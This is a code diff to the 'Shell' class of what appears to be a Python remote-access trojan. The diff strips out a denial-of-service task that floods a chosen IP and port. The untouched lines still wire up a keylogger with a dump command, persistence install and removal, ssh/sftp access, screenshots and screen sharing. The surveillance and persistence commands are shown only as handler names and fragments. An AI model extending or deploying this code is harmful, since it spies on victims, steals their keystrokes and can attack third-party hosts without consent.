@@ -7,7 +7,6 @@ import subprocess
 from os import chdir
 from time import sleep
 from queue import Queue
-from tasks.dos import Cyclops
 from threading import Thread, RLock
 from . import ssh, sftp, screen, sscreenshare, keylogger
 
@@ -26,7 +25,6 @@ class Shell(object):
 
         self.ftp = None
         self.ssh = None
-        self.task = None
         self.keylogger = None
         self.screenshare = None
 
@@ -40,17 +38,11 @@ class Shell(object):
             7: self.disconnect,
             8: self.create_persist,
             9: self.remove_persist,
-            10: self.task_start,
-            11: self.task_stop,
             12: self.logger_start,
             13: self.logger_stop,
             14: self.logger_dump,
             15: self.screenshare_start,
             16: self.screenshare_stop
-        }
-
-        self.tasks = {
-            1: self.dos,
         }
 
     def listen_recv(self):
@@ -79,9 +71,6 @@ class Shell(object):
                            args], daemon=True).start()
 
     def stop(self):
-        if self.task:
-            self.task.stop()
-
         if self.ssh:
             self.ssh.close()
 
@@ -221,22 +210,3 @@ class Shell(object):
     def logger_dump(self, args):
         if self.keylogger:
             self.send(-0, self.keylogger.dump())
-
-    ######## Tasks ########
-
-    def task_start(self, args):
-        task_id, args = args
-        if task_id in self.tasks:
-            if self.task:
-                self.task_stop(None)
-            self.tasks[task_id](args)
-
-    def task_stop(self, args):
-        if self.task:
-            self.task.stop()
-            self.task = None
-
-    def dos(self, args):
-        ip, port, threads = args
-        self.task = Cyclops(ip, port, threads)
-        self.task.start()
